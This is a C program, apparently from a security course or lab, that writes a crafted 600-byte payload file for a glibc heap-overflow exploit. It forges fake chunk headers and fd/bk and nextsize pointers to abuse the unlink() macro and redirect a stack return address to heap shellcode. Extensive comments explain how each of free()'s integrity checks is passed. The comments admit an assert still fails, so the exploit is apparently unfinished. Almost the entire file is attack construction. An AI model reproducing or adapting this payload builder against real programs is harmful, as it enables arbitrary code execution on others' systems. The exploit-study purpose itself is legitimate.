#include <stdlib.h>
#include <stdio.h>
#include <string.h>
void main(int argc, char **argv)
{
	char buffer[600];
	FILE *badfile;

	/* 
	Our first heap segment is allocated 12 bytes, this means that glibc expects the size of the size of the 
	second heap segment to start at the 13th byte.

	At this point we are overwriting the header of the second heap segment that our vulnerable program has 
	allocated. This is also the heap segment that we are going to be freeing in our vulnerable program. 
	Our goal is to overwrite this header, and to insert a third "fake" heap segment, that when unlinked 
	as a result of freeing the second heap segment will lead to the execution of our malicous code.
	*/
	size_t *size2 = (size_t *) (buffer+12);

	/*
	On lines 3926-3927 free() makes two checks
	1: (uintptr_t) p > (uintptr_t) -size
		size*= -1, cast to an unsigned int is the same thing as 2^32 - size
		so what we're really checking is, is p > 2^32 - size or is p + size > 2^32
		i.e. does this pointer plus its size point outsize of the space adressible with 32 bits.
		This condtion can be met by setting *size1=-0x8 (i.e. setting size=2^32-6 which will not
		set any of the status flags, but when added to p will surely be larger than 2^32).

	2: misaligned_chunk (p)
		Is this chunk aligned to 8 bytes? We are not altering this pointer, so we should be fine.
	
	If either of these 2 conditions are met, free throws the following error:
		"free(): invalid pointer" on line 3929. 

	On line 3937 free() makes the check
	size < MINSIZE

	MINSIZE is 0x10 in our implementation. If this condition is met the following error will be thrown:
    	"free(): invalid size"

	If we set *size1=0x8 we will pass the two previous checks, but fail this one.
	In general, if this value is not greater than 0x10 we can run into all kinds of errors in glibc. 

	However, we also want to avoid glibc's fastbin logic. Segments less then a certain size will be 
	treated differently, and will not be freed using the unlink() macro, which is what we're trying
	to exploit. 

	The branch for this behavior is determined on line 3950 with the following check:
	(unsigned long)(size) <= (unsigned long)(get_max_fast())
	
	For our system get_max_fast() is 64 bytes. We need to be greater than this, and 8 byte aligned
	so we must be at least 72 bytes (0x48).

	We also do not want to deal will the previous chunk in our expoit, so we can tell glibc that 
	this chunk is not free by setting the PREV_INUSE flag (0x1). When we OR these two together
	we get 0x49
	*/
  	*size2 = 0x49;

	/*
	Since we've set the previous chunk to be 72 bytes, and the first chunk had 12 bytes of data
	for us to fill, our 3rd segment will have an 84 byte offset in our copied data.
	*/
	size_t *size3= (size_t *) (buffer+84);

	/*
	There are several checks in the fastbin logic section that we are avoiding, and as such we 
	can ignore everything up to line 4016.

	?4041:
	p == av->top

	?4047:
	contiguous (av) && (char *) nextchunk >= ((char *) av->top + chunksize(av->top)

	They next check we have to pass is on line 4055:
	(!prev_inuse(nextchunk), 0))	
	
	This check is simply checking that the PREV_INUSE flag is set on the next chunk after the one
	we are attempting to free, i.e. that the next chunk on the heap thinks the chunk we are freeing
	is in use. In order to get past this check, we simply need to make sure that size we set for 
	this next chunk is OR'ed with the PREV_INUSE flag. If this flag is not set, for example 
	we set *size3=0x200, glibc will think this segment has already been freed and throw the following
	error: "double free or corruption (!prev)"


	This is the first of several checks that are concerned with the chunk following the one we 
	are trying to free, and this is where most of the magic happens. We want to convince free()
	that this next chunk is a valid free chunk, when actually is one that we have created within
	the memory allocated for the second chunk. We want to construct the fields of this chunk such
	that the unlink() function allows us to execarbitrary code, but more on that later....

	The next check concerning the size of this next chunk is on line 4062
	nextchunk->size <= 2 * SIZE_SZ || nextsize >= av->system_mem

	This is checking to see if the size of nextchunk is less then or equal to 8 bytes, or if its
	larger than the amount of space in the arena. I'm not sure why its checking of the segment is
	less than 8 bytes, as minimum size is 16. As long as the value is *size3 is >8 and reasonably
	sized, we can pass this check. But, if we want to trigger it we can do so by setting *size3=0x7
	which will throw the following error: free(): invalid next size (normal)
	
	This is the last of the checks on the size of the chunk we are freeing, and so we we can now 
	use this information to determine the size of our created chunk. We know that it must be at
	least 16 bytes, and that we want the PREV_INUSE flag set. We also know that within the
	unlink() function we want to trigger logic reserved for "large" chunks, which means that
	our segment must be at least 512 bytes. In the end, if we set *size3=0x201 we should 
	pass all of the checks and make it into the unlink() function.
	*/
	*size3 = 0x201;

	/*
	?4069:

	On line 4073, glibc checks to see if the chunk before the one we are freeing is marked as free.
	We have the PREV_INUSE flag set on our chunk, so it is marked as used, but if it wasn't, free()
	would call the unlink() macro on our chunk. 

	?4080:

	On line 4085, glibc checks to see if the chunk after the chunk after the chunk we are freeing
	has its PREV_INUSE flag set. This sounds confusing, but it isn't really. glibc keeps track of
	whether or not a chunk is free by looking at the size field of the following chunk and determining
	if this flag is set. Since we want glibc to think this segment is free, we actally need a segment
	following this one without the PREV_INUSE flag set. We don't actually need the entire segment, just
	this size field. Since we know that our third chunk is 512 bytes long, and that it had an offset
	off 84, the size of this 4th chunk will have an offset of 596. We don't really care what this
	value is, so long as its least significant bit is zero.
	*/
	
	size_t *size4 = (size_t*) (buffer+596);
	*size4 = 0x10;

	/*
	At this point we should have made it into the unlink() macro with our "fake" heap segment passed
	in as the argument(P). The first thing the unlink() macro does is set the variables FD and BK
	to P->fd and P-bk, respectively. Since we will nee to manipulate these values, lets figure out where
	they are stored in our buffer. The size field of badbuffer has an offset of 84, we know that 
	the fd and bk fields have offsets of 88 and 92, respectively.

	Also note that our fake heap segment has an address of 0x804b1c0 (determined using glibc).
	*/
	
	size_t *badbuffer_fd = (size_t *) (buffer+ 88);
	size_t *badbuffer_bk = (size_t *) (buffer+ 92);

	/*
	The first check we need to pass is on line 1548:
	FD->bk != P || BK->fd != P

	where FD=P->fd and BK=P->bk, so equivelently:
	P->fd->bk != P || P->bk->fd != P

	Essentially we are making sure that the doubly linked list of free heap segments is well formed.
	If we wanted be sure that we were in the unlink() macro, we could fail this test by setting
	*badbuffer_fd = 0x804b1c0 and *badbuffer_bk = 0x804b1c4. This fails because we are effectively 
	setting P->fd=badbuffer, and so P->fd->bk = 0x804b1c4 which does not equal P. The second conditional
	is not checked because we fail the first. This produces the following error:
	corrupted double-linked list: 0x0804b1c0

	If we want to get past this error, we can set both *badbuffer_fd and *badbuffer_bk to 0x804b1c0.
	This works because P->fd=P and P->bk=P so P->fd->bk=P and P->bk->fd=P. 
	*/
 
	*badbuffer_fd = 0x804b1c0;
	*badbuffer_bk = 0x804b1c0;

	/*
	Unfortunately after this, there are no more error messages in the unlink() macro, so we have to
	be a little more clever in determining how far our fake heap segment is getting. As is, the free()
	call will segfault, but we have no easy way of determining where or why. If we look at the code
	we see that immediately after the last check
	
	FD->bk = BK;                                                        
	BK->fd = FD;

	is executed. This will have no affect on our heap segment, as it will just set P->fd and P->bk to
	0x804b1c0 again. 

	The next check is on line 1553:
	
		!in_smallbin_range (P->size) && P->fd_nextsize != NULL

	The value of this conditional should be true, as P->size is 512, and is not in small bin range, and
	the value of P->fd_nextsize = 0x41 (since we have set the entire contents of memory to this value). 

	We now enter the heart of darkness on lines 1555-1569:

	assert (P->fd_nextsize->bk_nextsize == P);		        
	assert (P->bk_nextsize->fd_nextsize == P);		        
	if (FD->fd_nextsize == NULL) {				        
        if (P->fd_nextsize == P)				        
		FD->fd_nextsize = FD->bk_nextsize = FD;		        
		else {							        
			FD->fd_nextsize = P->fd_nextsize;			        
			FD->bk_nextsize = P->bk_nextsize;			        
			P->fd_nextsize->bk_nextsize = FD;			        
			P->bk_nextsize->fd_nextsize = FD;			        
		}							        
	}else {							        
		P->fd_nextsize->bk_nextsize = P->bk_nextsize;		        
		P->bk_nextsize->fd_nextsize = P->fd_nextsize;		        
	}	

	The first question is, if the assert() calls fail, will the program continue to execute?

	Since FD=P, we know that FD->fd_nextsize is not null, so we only execute the else statement.
   	We want P->fd_nextsize->bk_nextsize to be the location on the stack of the return address.
	Since we know that the bk_nextsize field has a 20 byte offset in the malloc_chunk struct
	we want P->fd_nextsize = return address - 20. If we set P->bk_nextsize to be the address
	of our shellcode, we should effectively point the return address on the stack to our
	shellcode.

	But what will happen on the second line? We will set the address of our shellcode + 16 to
	the return address - 20. This will overwrite some of our shellcode, but our primary
	objective at this point is to determine if we can pass the assert() checks. 

	The return address should be 0xbfffebbc, so minus 20 will be 0xbfffeba8. We want to 
	point this to the remaining space we have on the heap which will start at 0x804b1e0.

	If we run this in gdb, the assert check fails. 
	*/

	size_t *badbuffer_fd_nextsize = (size_t*)(buffer+96);
	size_t *badbuffer_bk_nextsize = (size_t*)(buffer+100);

	*badbuffer_fd_nextsize = 0xbfffeba8;
	*badbuffer_bk_nextsize = 0x804b1e0;
	
        badfile = fopen("./diagfile", "w");
	fwrite(buffer, 600, 1, badfile);
	fclose(badfile);
}
